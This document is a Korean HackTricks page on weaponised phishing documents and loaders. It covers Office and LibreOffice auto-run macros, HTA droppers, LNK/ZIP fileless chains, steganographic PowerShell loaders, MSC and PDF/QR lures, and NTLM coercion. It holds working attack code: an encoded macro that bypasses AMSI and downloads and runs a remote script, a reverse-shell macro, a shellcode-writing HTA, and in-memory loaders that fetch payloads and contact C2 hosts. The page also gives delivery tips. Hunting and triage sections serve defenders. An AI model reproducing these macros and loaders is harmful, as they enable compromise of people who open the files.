# 피싱 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조를 식별하는 과정에서 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경해 파일 이름을 바꾸더라도 매크로 실행 기능은 유지할 수 있습니다.\
예를 들어 RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 확장자를 RTF로 바꾸면 Microsoft Word에서 해당 파일을 처리하고 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘은 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하면 일부 Office 프로그램에서 실행되는 확장자를 확인할 수 있습니다:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX 파일은 매크로가 포함된 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하여 매크로를 “실행”할 수도 있습니다.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 외부 이미지 로드: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros 백도어

매크로를 사용하여 문서에서 임의의 코드를 실행할 수 있습니다.

#### 자동 로드 함수

많이 사용될수록 AV가 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### Macros 코드 예시

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### Doc 확장자

작업이 끝나면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**으로 변경합니다.\
**`.docx`에는 매크로를 저장할 수 없고**, 매크로 사용 **`.docm`** 확장자는 **부정적인 인식**이 있기 때문입니다(예: 썸네일 아이콘에 큰 `!`가 표시되며 일부 웹/이메일 게이트웨이는 파일을 완전히 차단합니다). 따라서 기존 **`.doc` 확장자가 가장 적절한 절충안**입니다.

#### 악성 매크로 생성기

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 매크로 (Basic)

LibreOffice Writer 문서에는 Basic 매크로를 포함할 수 있으며, 매크로를 **Open Document** 이벤트에 연결하면 파일을 열 때 자동으로 실행됩니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell 매크로는 다음과 같습니다:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

문자열 안의 따옴표가 두 번씩 표시된 부분(`""`)에 유의하세요. LibreOffice Basic에서는 리터럴 따옴표를 이스케이프하는 데 이를 사용하므로, `...==""")`로 끝나는 payload는 내부 명령과 Shell 인수의 따옴표가 모두 균형을 이룹니다.

전달 팁:

- `.odt`로 저장하고 매크로를 문서 이벤트에 연결해 문서를 열자마자 실행되도록 합니다.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용합니다(`@`가 필요합니다. 그래야 파일 이름 문자열이 아니라 파일의 바이트가 첨부 파일로 전송됩니다). 임의의 `RCPT TO` 수신자를 검증 없이 허용하는 SMTP 서버를 악용할 때 특히 중요합니다.

## HTA 파일

HTA는 **HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전히 신뢰할 수 있는" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행합니다. 이 파일은 일반적으로 **Internet Explorer와 함께 설치되므로**, **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML 이메일의 가짜 첨부 파일 카드

HTML 이메일은 실제 첨부 파일을 포함하는 대신, 이메일 제공업체의 기본 첨부 파일 미리보기 카드를 모방할 수 있습니다. Talos는 Base64로 인코딩된 인라인 PNG MIME 파트 네 개로 재구성한 Gmail 카드를 관찰했습니다. 카드의 시각적 요소 전체를 하나의 앵커로 감쌌으며, `?m=<target-id>`의 수신자 값을 사용해 수신자별 추적을 활성화했습니다. 링크는 `http://`나 `https://`가 아닌 `//`로 시작했습니다. 브라우저는 이 프로토콜 상대 형식을 확인해 URL을 처리하지만, 완전한 형식의 URL만 찾는 URL 추출기는 이를 놓칠 수 있습니다.<sup>[[11]](#references)</sup>

분석할 때는 렌더링된 첨부 파일 목록을 그대로 믿지 말고 원시 MIME을 확인하세요. 인라인 이미지 파트가 시각적 카드를 어떻게 구성하는지 재구성하고, 카드를 감싸는 앵커를 식별한 다음, URL을 추출하기 전에 프로토콜 상대 `href` 값을 정규화하세요.<sup>[[11]](#references)</sup>

봉투/헤더 발신자 스푸핑 및 DMARC 정렬 테스트는 [SMTP 메일 스푸핑 대응책](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)을 참조하세요.

## NTLM 인증 강제

**원격으로 NTLM 인증을 강제**하는 방법은 여러 가지가 있습니다. 예를 들어, 사용자가 열어 볼 이메일이나 HTML에 **보이지 않는 이미지**를 넣을 수 있습니다(HTTP MitM도 가능할까요?). 또는 **폴더를 여는 것만으로 인증을 유발하는** 파일 **주소**를 피해자에게 보낼 수 있습니다.

**이러한 아이디어와 더 많은 내용은 다음 페이지에서 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증 정보를 탈취하는 것뿐만 아니라 **NTLM relay 공격도 수행할 수 있다**는 점을 잊지 마세요.

- [**NTLM Relay 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (인증서로의 NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK 로더 + ZIP에 삽입된 페이로드 (fileless 체인)

효과가 높은 캠페인은 정상적인 미끼 문서 두 개(PDF/DOCX)와 악성 .lnk가 들어 있는 ZIP 파일을 전달합니다. 핵심은 실제 PowerShell 로더가 ZIP의 원시 바이트 내 고유한 마커 뒤에 저장되어 있으며, .lnk가 이를 추출해 메모리에서 바로 실행한다는 점입니다.<sup>[[2]](#references)</sup>

일반적인 .lnk PowerShell one-liner의 동작 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% 및 현재 작업 디렉터리의 상위 디렉터리 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP 바이트를 읽고 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 뒤의 모든 내용이 삽입된 PowerShell 페이로드입니다.
3) ZIP을 %ProgramData%에 복사해 그곳에 압축을 풀고, 정상적인 파일처럼 보이도록 미끼 .docx를 엽니다.
4) 현재 프로세스에서 AMSI를 우회합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계를 난독화 해제하고(예: 모든 # 문자 제거) 메모리에서 실행합니다.

삽입된 단계를 추출해 실행하는 PowerShell 기본 예시:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

메모
- 전달 과정에서 평판이 좋은 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하는 경우가 많으며, 페이로드 제공을 조건부로 제한할 수 있습니다(IP/UA에 따라 무해한 ZIP 제공).
- 다음 단계에서는 base64/XOR shellcode를 복호화한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하는 경우가 많아 디스크에 남는 흔적을 최소화합니다.

같은 체인에서 사용된 Persistence
- Microsoft Web Browser 컨트롤의 COM TypeLib hijacking을 통해 IE/Explorer 또는 해당 컨트롤을 포함하는 모든 앱이 페이로드를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 명령은 여기에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- 상위/사용자 폴더를 열거해 ZIP을 찾고 미끼 문서를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI 변조.
- 신뢰할 수 있는 PaaS 도메인에서 호스팅된 링크로 끝나는 장시간 진행되는 업무 관련 스레드.

## LNK 미끼 우선 staging → scheduled-task persistence → 신뢰된 CPL side-loading

반복적으로 관찰되는 또 다른 패턴은 **문서로 위장한 `.lnk`**가 먼저 무해한 미끼를 즉시 열고, 백그라운드에서 실제 체인을 준비하는 방식입니다.<sup>[[3]](#references)</sup>

관찰된 작업 흐름:
1. 바로 가기가 **PDF로 위장**하고 `conhost.exe` 또는 유사한 proxy를 사용해 난독화된 PowerShell downloader를 실행합니다.
2. PowerShell은 명백한 토큰을 분할합니다(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`). 따라서 `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순 탐지에서는 명령을 놓칠 수 있습니다.
3. stager는 **미끼 문서를 먼저 다운로드**해 피해자에게 열어 준 다음, 백그라운드에서 악성 파일을 재구성합니다.
4. 페이로드는 **정크 확장자**로 저장된 뒤 채움 문자를 제거하는 방식으로 이름이 바뀔 수 있어, 눈에 띄는 `.exe` / `.cpl` 흔적이 나타나는 시점이 늦춰집니다.
5. 사용자 쓰기 가능 경로의 신뢰된 host binary를 실행하는 **분 단위 scheduled task**로 Persistence를 설정합니다.

이 패턴에서 활용할 최소한의 hunting 단서:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

인식해 두면 유용한 staging 레이아웃:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 단계가 은밀한 이유

Rapid7 사례 연구에서 예약된 작업은 **`Fondue.exe`**를 `C:\Users\Public\`에서 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 배치되어 있었고 **`RunFODW`**를 export했기 때문에, 신뢰할 수 있는 Microsoft 바이너리는 정상적인 시스템 사본 대신 공격자의 CPL을 side-load했습니다.

그 CPL은 다음을 수행했습니다:
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽습니다.
- **Windows CNG / `bcrypt.dll`**을 통해 이를 복호화합니다.
- 실행 가능한 메모리를 할당하고 복호화된 shellcode를 복사합니다.
- **`EnumUILanguagesW`**의 callback으로 shellcode 포인터를 전달해 간접적으로 실행합니다.

마지막 단계는 별도로 hunting할 가치가 있습니다. malware는 직접적인 `((void(*)())buf)()` 점프를 피하고 대신 **정상적인 callback 인자를 받는 WinAPI**를 악용해 실행을 넘기는 경우가 많습니다.

이 캠페인의 복호화된 payload는 **Donut** shellcode였으며, 이후 최종 PE를 메모리에서 완전히 매핑하고 현재 프로세스의 **AMSI/WLDP/ETW**를 패치한 뒤 실행을 넘겼습니다. side-loading과 메모리 상주 post-processing에 관한 자세한 내용은 다음을 참조하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실용적인 hunting 기준:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 실행한 뒤 눈에 보이는 미끼 문서를 표시합니다.
- `C:\Users\Public\`로 짧은 시간 동안 파일을 다운로드한 뒤, 의미 없는 확장자에서 즉시 이름을 변경합니다.
- `GoogleErrorReport`처럼 평범한 이름의 예약된 작업이 **사용자 쓰기 가능 디렉터리**에서 실행됩니다.
- 신뢰할 수 있는 바이너리가 동일한 비시스템 디렉터리에서 **`.cpl` / `.dll`** 파일을 로드합니다.
- Base64 텍스트 blob을 **`C:\Windows\Tasks\`**에 기록한 뒤 side-loaded 모듈이 읽습니다.

## 이미지 내 스테가노그래피 구분자 payload (PowerShell stager)

최근 loader chain은 난독화된 JavaScript/VBS를 전달하며, 이 파일은 Base64 PowerShell stager를 디코딩하고 실행합니다. 이 stager는 Base64로 인코딩된 .NET DLL이 고유한 시작/끝 marker 사이에 일반 텍스트로 숨겨진 이미지(주로 GIF)를 다운로드합니다. 스크립트는 이 구분자를 검색하고(실제 사례에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»), 두 marker 사이의 텍스트를 추출한 뒤 Base64를 bytes로 디코딩하고, assembly를 메모리에 로드한 다음 C2 URL과 함께 알려진 진입 메서드를 호출합니다.<sup>[[5]](#references)</sup>

워크플로
- Stage 1: Archived JS/VBS dropper → 내장된 Base64 디코딩 → `-nop -w hidden -ep bypass`를 사용해 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, marker로 구분된 Base64 추출, .NET DLL을 메모리에 로드하고 C2 URL과 옵션을 전달해 해당 메서드(예: VAI) 호출.
- Stage 3: Loader가 최종 payload를 가져와 보통 신뢰할 수 있는 바이너리(주로 MSBuild.exe)에 process hollowing으로 주입합니다.<sup>[[7]](#references)[[8]](#references)</sup> process hollowing과 신뢰할 수 있는 유틸리티를 통한 proxy execution에 대한 자세한 내용은 여기에서 확인하세요:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

이미지에서 DLL을 추출하고 메모리에서 .NET 메서드를 호출하는 PowerShell 예시:

<details>
<summary>PowerShell 스테고 payload 추출기 및 loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다.<sup>[[6]](#references)</sup> 마커는 캠페인마다 다릅니다.
- AMSI/ETW 우회와 문자열 난독화 해제는 어셈블리를 로드하기 전에 흔히 적용됩니다.
- 헌팅: 다운로드한 이미지에서 알려진 구분자를 스캔하고, 이미지에 접근한 뒤 즉시 Base64 blob을 디코딩하는 PowerShell을 식별합니다.

다음도 참고하세요: stego 도구 및 carving 기법

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS 드로퍼 → Base64 PowerShell 스테이징

반복적으로 사용되는 초기 단계는 아카이브 안에 전달되는 작고 심하게 난독화된 `.js` 또는 `.vbs` 파일입니다. 이 파일의 유일한 목적은 내장된 Base64 문자열을 디코딩하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행해 HTTPS를 통해 다음 단계를 시작하는 것입니다.<sup>[[5]](#references)</sup>

기본 로직(개요):
- 파일 자체의 내용을 읽음
- 무의미한 문자열 사이에서 Base64 blob을 찾음
- ASCII PowerShell로 디코딩함
- `wscript.exe`/`cscript.exe`가 `powershell.exe`를 호출하도록 실행함

헌팅 단서
- 명령줄에 `-enc`/`FromBase64String`이 포함된 `powershell.exe`를 실행하는 아카이브 내 JS/VBS 첨부 파일.
- 사용자 임시 경로에서 `powershell.exe -nop -w hidden`을 실행하는 `wscript.exe`.

## 실행 컨테이너로 사용되는 MSC 문서(GrimResource)

Microsoft Management Console 파일(`.msc`)은 일반적으로 `mmc.exe`로 여는 XML 콘솔 정의 파일입니다. **GrimResource**는 `apds.dll` 리소스에 포함된 오래된 XSS 원시 기능을 가리키는 `StringTable` 참조를 악용하여, 사용자가 조작된 콘솔을 열면 `mmc.exe` 내부에서 JavaScript가 실행되도록 합니다. 관찰된 샘플은 `transformNode` 기반 난독화와 **DotNetToJScript**를 결합해, 일반적인 Office 매크로 경로 없이 .NET 페이로드를 인스턴스화했습니다.<sup>[[9]](#references)</sup>

정적 초기 분석에서는 신뢰할 수 없는 MSC를 텍스트로 취급하고 **더블클릭하지 마세요**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivot은 `mmc.exe`가 CLR 또는 script 구성 요소를 로드하거나, 네트워크 연결을 생성하거나, `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` 또는 예상치 못한 실행 파일을 실행하는 경우입니다. 이 형식은 정상적으로 사용되므로, 모든 MSC를 차단하기보다 **출처 + 의심스러운 XML/script 콘텐츠 + `mmc.exe` 동작**을 연관 분석해 탐지해야 합니다.<sup>[[9]](#references)</sup>

## PDF/QR 리디렉터 및 페이로드 게이팅

PDF가 유용하려면 exploit이 필요한 것은 아닙니다. 최근 캠페인은 무해해 보이는 문서에 **QR 코드 또는 일반 링크**를 넣고, 브라우저 세션을 메일 보안 제어에서 벗어나게 한 뒤 수신자 주소에 맞춰 목적지를 개인화합니다. Microsoft는 2025년에 수신자별로 고유한 QR URL을 사용해 RaccoonO365 자격 증명 탈취 인프라로 연결되는 PDF를 문서화했습니다. 병행된 공격 체인은 IP/환경 게이팅을 사용해 선택된 방문자에게는 JavaScript/MSI 경로를 반환하고, 스캐너나 허용되지 않은 클라이언트에는 무해한 PDF를 반환했습니다.<sup>[[10]](#references)</sup>

PDF 동작과 렌더링된 QR 코드를 모두 조사하세요. QR은 추출 가능한 이미지로 저장되는 대신 벡터로 그려질 수 있으므로, 포함된 이미지를 추출하는 것과 함께 모든 페이지를 래스터화하세요:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

디코딩된 목적지와 리디렉션을 인증 없이 격리된 분석 시스템에서 확인하세요. 유용한 탐색 특징으로는 QR 코드만 포함된 PDF와 내용이 거의 없는 이메일 본문, 쿼리 매개변수에 삽입된 수신자 이메일, 평판이 좋은 호스팅 서비스를 여러 번 거치는 리디렉션, IP, 지리적 위치, 쿠키, 리퍼러 또는 사용자 에이전트에 따라 달라지는 응답 콘텐츠가 있습니다. 단일 샌드박스 요청에는 미끼만 반환될 수 있으므로, 통제된 프로필을 사용해 요청을 비교하세요.<sup>[[10]](#references)</sup>

## NTLM 해시를 탈취하기 위한 Windows 파일

**NTLM 자격 증명을 탈취할 수 있는 위치** 페이지를 확인하세요.

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice 매크로 → IIS 웹셸 → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine 캠페인: 미국 기업을 겨냥한 정교한 피싱 공격](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 중국 테마 로더 체인을 통한 Dropping Elephant의 tradecraft 추적](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib 하이재킹 – 새로운 COM 지속성 기법 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader가 다양한 인포스틸러를 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 초기 접근 및 회피를 위한 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 위협 행위자들이 세금 신고 기간을 이용해 세금 테마 피싱 캠페인을 전개](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 전달 체인 및 Antino 백도어](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
